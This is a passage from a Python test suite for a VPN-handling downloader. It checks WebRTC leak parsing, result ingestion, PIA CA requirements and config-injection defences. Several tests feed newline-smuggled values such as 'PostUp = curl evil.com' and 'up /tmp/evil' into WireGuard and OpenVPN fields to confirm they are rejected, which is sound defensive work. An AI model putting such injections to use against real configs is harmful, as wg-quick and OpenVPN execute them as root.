        js = vpn_leak_tests.WEBRTC_PROBE_JS
        # Old code did `sdp.match(ipv6Re)` over the entire SDP body. New
        # code splits on lines and only inspects 'a=candidate:' entries.
        assert "sdp.match(ipv4Re)" not in js, (
            "raw-SDP regex scan still present; this re-introduces "
            "the fingerprint false-positive that trips the kill switch"
        )
        assert "sdp.match(ipv6Re)" not in js
        assert "a=candidate:" in js, (
            "candidate-line parser was removed; WebRTC probe will no "
            "longer find any addresses"
        )

    def test_webrtc_js_treats_placeholders_as_private(self):
        from bulk_downloader import vpn_leak_tests
        js = vpn_leak_tests.WEBRTC_PROBE_JS
        # 0.0.0.0 placeholder and IPv6 '::' must be classified private,
        # otherwise the `c=IN IP4 0.0.0.0` line keeps causing kills.
        assert "'0.0.0.0'" in js
        assert "'::'" in js or "\"::\"" in js


class TestPhase5LeakTestsExternalResultIngest:
    """Locks in Phase 5 audit fix: record_external_probe_result used
    int(result.get("duration_ms", 0) or 0) which raised ValueError on a
    worker that posted a non-numeric string. The endpoint that calls
    this (POST /api/vpn/tunnels/<id>/webrtc_result) doesn't catch the
    exception, so the worker would see HTTP 500 and the probe result
    would be lost. The fix coerces defensively."""

    def setup_method(self, method=None):
        from bulk_downloader import vpn_leak_tests
        vpn_leak_tests._reset_for_tests()

    def teardown_method(self, method=None):
        from bulk_downloader import vpn_leak_tests
        vpn_leak_tests._reset_for_tests()

    def test_record_handles_string_duration_ms(self):
        from bulk_downloader import vpn_leak_tests
        # Pre-fix: int("abc") -> ValueError -> 500. Post-fix: stored as 0.
        vpn_leak_tests.record_external_probe_result(
            "tun-x", "webrtc_leak",
            {"passed": True, "duration_ms": "abc", "details": {}},
        )
        latest = vpn_leak_tests._external_results.get("tun-x", {}).get("webrtc_leak")
        assert latest is not None, "record was rejected/crashed"
        pr, _ts = latest
        assert pr.duration_ms == 0
        assert pr.passed is True

    def test_record_handles_non_dict_result(self):
        from bulk_downloader import vpn_leak_tests
        # Don't crash on a worker that sends a JSON array or null body.
        vpn_leak_tests.record_external_probe_result("tun-y", "webrtc_leak", None)  # type: ignore
        latest = vpn_leak_tests._external_results.get("tun-y", {}).get("webrtc_leak")
        assert latest is not None
        pr, _ts = latest
        assert pr.passed is False
        assert pr.details == {}

    def test_record_handles_non_string_error(self):
        from bulk_downloader import vpn_leak_tests
        # error should always store as a string or None -- never a dict
        # which would later break JSON serialization in get_history.
        vpn_leak_tests.record_external_probe_result(
            "tun-z", "webrtc_leak",
            {"passed": False, "error": {"obj": "shouldn't be here"}, "details": "not-a-dict"},
        )
        pr, _ts = vpn_leak_tests._external_results["tun-z"]["webrtc_leak"]
        assert pr.error is None  # dict was rejected, normalized to None
        assert pr.details == {}  # non-dict details normalized to {}

    def test_record_negative_duration_clamps_to_zero(self):
        from bulk_downloader import vpn_leak_tests
        vpn_leak_tests.record_external_probe_result(
            "tun-n", "webrtc_leak", {"passed": True, "duration_ms": -999},
        )
        pr, _ts = vpn_leak_tests._external_results["tun-n"]["webrtc_leak"]
        assert pr.duration_ms == 0


class TestPhase5PiaCaRequirement:
    """Locks in Phase 5 audit fix: PIA OpenVPN template needs a CA.

    Pre-fix the template had `tls-client` + `remote-cert-tls server` but
    no `<ca>` block, so OpenVPN refused to start with "Cannot load
    certificate authority" on every PIA connection attempt. Fix made
    `ca_pem` a required credential and embeds it inline."""

    def test_render_config_fails_loudly_without_ca(self):
        from bulk_downloader.vpn_providers import pia
        try:
            pia.render_config(
                "openvpn", "us_new_york_city",
                {"username": "p1234567", "password": "secret"},
                40000,
            )
        except ValueError as e:
            assert "CA certificate" in str(e), f"unhelpful error: {e}"
            return
        raise AssertionError("render_config should have raised without ca_pem")

    def test_render_config_rejects_non_pem_ca(self):
        from bulk_downloader.vpn_providers import pia
        try:
            pia.render_config(
                "openvpn", "us_new_york_city",
                {"username": "p1234567", "password": "secret",
                 "ca_pem": "not a cert at all"},
                40000,
            )
        except ValueError as e:
            assert "CA certificate" in str(e)
            return
        raise AssertionError("non-PEM ca_pem should be rejected")

    def test_render_config_embeds_ca_inline(self):
        from bulk_downloader.vpn_providers import pia
        ca = (
            "-----BEGIN CERTIFICATE-----\n"
            "MIIFqzCCBJOgAwIBAgIJAKZ7D5Yv87qDMA0GCSqGSIb3DQEBDQUAMIHrMQswCQYD\n"
            "-----END CERTIFICATE-----"
        )
        cfg = pia.render_config(
            "openvpn", "us_new_york_city",
            {"username": "p1234567", "password": "secret", "ca_pem": ca},
            40000,
        )
        ovpn = cfg["ovpn"]
        assert "<ca>" in ovpn and "</ca>" in ovpn
        assert "BEGIN CERTIFICATE" in ovpn
        assert "aes-256-cbc" in ovpn  # not the broken weak cipher anymore
        assert "auth sha256" in ovpn
        # Server identity verification stays enabled
        assert "remote-cert-tls server" in ovpn
        assert "tls-client" in ovpn
        # Username/password preserved in returned dict
        assert cfg["username"] == "p1234567"
        assert cfg["password"] == "secret"

    def test_schema_advertises_ca_field_as_required(self):
        from bulk_downloader.vpn_providers import pia
        ca_field = next((f for f in pia.CREDENTIALS_SCHEMA
                         if f.get("key") == "ca_pem"), None)
        assert ca_field is not None, "CA field missing from schema"
        assert ca_field.get("required") is True


class TestPhase5WGRenderInjection:
    """Phase 5 vulnerability: vpn_wireguard.render_conf f-string-interpolated
    user-supplied values (private_key, peer_public_key, endpoint, address,
    dns, allowed_ips, preshared_key) into a wg-quick .conf file without
    validation. WireGuard .conf supports `PostUp = <cmd>` and `PreUp =
    <cmd>` directives that wg-quick executes as root. A user pasting a
    Proton WG config with `"private_key": "ABC=\\nPostUp = curl evil/exfil"`
    would get root-level command execution.
    """

    def test_newline_in_private_key_rejected(self):
        from bulk_downloader.vpn_wireguard import render_conf
        try:
            render_conf({
                "private_key": "ABC=\nPostUp = curl evil.com",
                "address": "10.0.0.2/32",
                "peer_public_key": "DEF=",
                "endpoint": "vpn.example.com:51820",
            })
            raise AssertionError("expected ValueError on newline-in-key")
        except ValueError as e:
            assert "forbidden" in str(e).lower() or "PostUp" in str(e) or "newline" in str(e).lower()

    def test_newline_in_endpoint_rejected(self):
        from bulk_downloader.vpn_wireguard import render_conf
        try:
            render_conf({
                "private_key": "ABC=",
                "address": "10.0.0.2/32",
                "peer_public_key": "DEF=",
                "endpoint": "vpn.example.com:51820\nPostUp = whoami",
            })
            raise AssertionError("expected ValueError")
        except ValueError:
            pass

    def test_section_bracket_rejected(self):
        """`[` opens a new INI section, allowing the attacker to redefine
        [Interface] or add a sibling [Peer]."""
        from bulk_downloader.vpn_wireguard import render_conf
        try:
            render_conf({
                "private_key": "ABC=",
                "address": "10.0.0.2/32",
                "peer_public_key": "DEF=",
                "endpoint": "vpn.example.com:51820 ]\n[Interface]\nPostUp = evil",
            })
            raise AssertionError("expected ValueError")
        except ValueError:
            pass

    def test_legitimate_config_still_renders(self):
        """Defense must not break working configs."""
        from bulk_downloader.vpn_wireguard import render_conf
        out = render_conf({
            "private_key": "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789012345=",
            "address": "10.66.1.2/32,fd00::2/128",
            "peer_public_key": "ZYXWVUTSRQPONMLKJIHGFEDCBA9876543210987654=",
            "endpoint": "vpn.example.com:51820",
            "dns": "10.66.0.1",
            "mtu": 1280,
            "allowed_ips": "0.0.0.0/0,::/0",
            "persistent_keepalive": 25,
        })
        assert "[Interface]" in out
        assert "[Peer]" in out
        assert "PostUp" not in out  # nothing snuck in


class TestPhase5OvpnAuthInjection:
    """Phase 5 vulnerability: vpn_openvpn writes the OpenVPN auth file as
    f"{username}\\n{password}\\n". A username containing "\\n" lets attacker
    restructure the file so OpenVPN reads attacker-controlled text as the
    password.

    We can't easily test the file write side without a heavy mock, so we
    inspect the static source for the newline-rejection check we added.
    """

    def test_openvpn_validates_auth_field_newlines(self):
        from pathlib import Path
        src = (Path(__file__).parent.parent / "bulk_downloader"
                / "vpn_openvpn.py").read_text(encoding="utf-8")
        # Look for the explicit newline check we added around the auth file
        # write. If someone removes it, this test fails.
        assert 'bad_chars = {"\\n"' in src or "bad_chars" in src, (
            "vpn_openvpn.py must validate that username/password contain "
            "no newlines before writing the auth file"
        )
        # And: the check must come BEFORE the auth file write. P13-A replaced
        # the bare `auth_path.write_text(...)` with a private-from-birth
        # `_write_private(auth_path, ...)` (os.open 0o600); the ordering
        # guarantee is unchanged, so key on the current write call.
        bad_idx = src.find("bad_chars")
        write_idx = src.find('_write_private(auth_path')
        assert bad_idx > 0 and write_idx > 0 and bad_idx < write_idx, (
            "newline validation must precede auth file write"
        )


class TestPhase5MullvadRelayInjectionGuard:
    """Audit 2026-05 (Phase 5): Mullvad's API response is parsed into
    location dicts whose `hostname` and `endpoint` get interpolated into
    OpenVPN .ovpn and wg-quick .conf files. If the API were ever MITM'd
    (or simply broken), an attacker-controlled hostname with a newline
    could inject an OpenVPN `up /path/to/script` directive which OpenVPN
    runs at connect time -- script-exec.

    `_parse_relay_list` now whitelists hostname/IPv4/pubkey/port and
    silently drops bad entries. These tests pin that behavior.
    """

    def test_clean_relay_passes(self):
        from bulk_downloader.vpn_providers import mullvad
        good = [{
            "hostname": "us-nyc-wg-101.relays.mullvad.net",
            "location": {"country": "US", "city": "New York"},
            "pubkey": "A" * 43 + "=",
            "ipv4_addr_in": "185.213.155.66",
            "port": 51820,
        }]
        out = mullvad._parse_relay_list(good)
        assert len(out) == 1
        assert out[0]["endpoint"] == "185.213.155.66:51820"
        assert out[0]["hostname"] == "us-nyc-wg-101.relays.mullvad.net"

    def test_hostname_with_newline_dropped(self):
        from bulk_downloader.vpn_providers import mullvad
        bad = [{
            "hostname": "us-nyc.mullvad.net\nup /tmp/evil",
            "location": {"country": "US", "city": "NYC"},
            "pubkey": "A" * 43 + "=",
            "ipv4_addr_in": "1.2.3.4",
            "port": 51820,
        }]
        out = mullvad._parse_relay_list(bad)
        assert out == [], "newline in hostname must drop the relay"

    def test_ipv4_with_garbage_dropped(self):
        from bulk_downloader.vpn_providers import mullvad
        bad = [{
            "hostname": "x.mullvad.net",
            "location": {},
            "pubkey": "A" * 43 + "=",
            "ipv4_addr_in": "1.2.3.4\nup /tmp/evil",
            "port": 51820,
        }]
        out = mullvad._parse_relay_list(bad)
        assert out == []

    def test_bad_port_dropped(self):
        from bulk_downloader.vpn_providers import mullvad
        bad = [{
            "hostname": "x.mullvad.net",
            "location": {},
            "pubkey": "A" * 43 + "=",
            "ipv4_addr_in": "1.2.3.4",
            "port": 99999,  # out of range
        }]
        assert mullvad._parse_relay_list(bad) == []

    def test_garbage_pubkey_dropped(self):
        from bulk_downloader.vpn_providers import mullvad
        bad = [{
            "hostname": "x.mullvad.net",
            "location": {},
            "pubkey": "not-a-real-base64-key",
            "ipv4_addr_in": "1.2.3.4",
            "port": 51820,
        }]
        assert mullvad._parse_relay_list(bad) == []

    def test_city_with_newline_blanked(self):
        from bulk_downloader.vpn_providers import mullvad
        weird = [{
            "hostname": "x.mullvad.net",
            "location": {"country": "us", "city": "New York\ninjection"},
            "pubkey": "A" * 43 + "=",
            "ipv4_addr_in": "1.2.3.4",
            "port": 51820,
        }]
        out = mullvad._parse_relay_list(weird)
        assert len(out) == 1
        assert out[0]["city"] == "", "city with newline must be blanked"

    def test_register_device_rejects_bad_account(self):
        from bulk_downloader.vpn_providers import mullvad
        import pytest
        with pytest.raises(RuntimeError, match="invalid Mullvad account"):
            mullvad.register_device("not-16-digits", "A" * 43 + "=")

    def test_register_device_rejects_bad_pubkey(self):
        from bulk_downloader.vpn_providers import mullvad
        import pytest
        with pytest.raises(RuntimeError, match="invalid WireGuard public key"):
            mullvad.register_device("1234567890123456", "not-a-key")
